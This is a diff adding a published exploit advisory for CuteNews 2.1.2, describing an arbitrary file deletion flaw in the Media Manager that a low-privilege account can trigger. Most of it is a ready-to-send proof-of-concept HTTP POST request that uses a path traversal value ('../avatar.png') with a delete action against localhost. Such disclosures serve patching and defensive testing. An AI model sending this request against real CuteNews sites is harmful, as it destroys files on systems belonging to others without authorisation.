@@ -1,0 +1,37 @@
+# Exploit Title: CuteNews 2.1.2 - Arbitrary File Deletion
+# Date: 2020-05-08
+# Author: Besim ALTINOK
+# Vendor Homepage: https://cutephp.com
+# Software Link: https://cutephp.com/click.php?cutenews_latest
+# Version: v2.1.2 (Maybe it affect other versions)
+# Tested on: Xampp
+# Credit: İsmail BOZKURT
+# Remotely: Yes
+
+Description:
+------------------------------------------------------------------------
+In the "Media Manager" area, users can do arbitrarily file deletion.
+Because the developer did not use the unlink() function as secure. So, can
+be triggered this vulnerability by a low user account
+
+
+Arbitrary File Deletion PoC
+--------------------------------------------------------------------------------
+
+POST /cute/index.php HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 **********************************
+Accept:
+text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 222
+Origin: http://localhost
+DNT: 1
+Connection: close
+Referer: http://localhost/cute/index.php
+Cookie: CUTENEWS_SESSION=3f6a6ea7089e3a6a04b396d382308022
+Upgrade-Insecure-Requests: 1
+
+mod=media&opt=media&folder=&CKEditorFuncNum=&callback=&style=&faddm=&imgopts=&__signature_key=27966e9129793e80a70089ee1c3ebfd5-tester&__signature_dsi=0ad6659c2aa31871b0b44617cf0b1200&rm%5B%5D=../avatar.png&do_action=delete
